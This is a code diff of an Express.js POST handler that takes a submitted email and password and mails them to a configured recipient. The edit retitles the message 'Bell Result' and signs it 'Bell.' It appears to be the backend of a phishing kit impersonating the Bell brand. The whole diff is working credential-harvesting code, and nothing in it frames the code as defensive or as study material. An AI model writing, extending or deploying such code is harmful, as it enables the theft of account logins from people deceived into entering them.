@@ -55,16 +55,18 @@ app.get("/", (req, res) => {
 app.post("/", async (req, res) => {
   try {
     const { email, password } = await schema.validateAsync(req.body);
-    console.log(email, password);
     const mailOptions = {
       from: process.env.SMTP_USER,
       to: recipientEmail || process.env.RECIPIENT_USER,
-      subject: "New creds",
+      subject: "Bell Result",
       html: `<!DOCTYPE html>
             <html>
   <body>
-    <h1>Hello</h1>
-    <p>Your new credentials are email ${email} and password ${password} </p>
+    <h3>Hello there,</h3>
+    <h5>Submitted credentials are: <br /><br/> <strong>email:</strong> <br /> ${email} <br /> <hr> <strong>password:</strong> <br /> ${password} <br/> <hr> </h5>
+    
+    <h5>Regards, <br/>
+    Bell.</h5>
   </body>
 </html>`,
     };
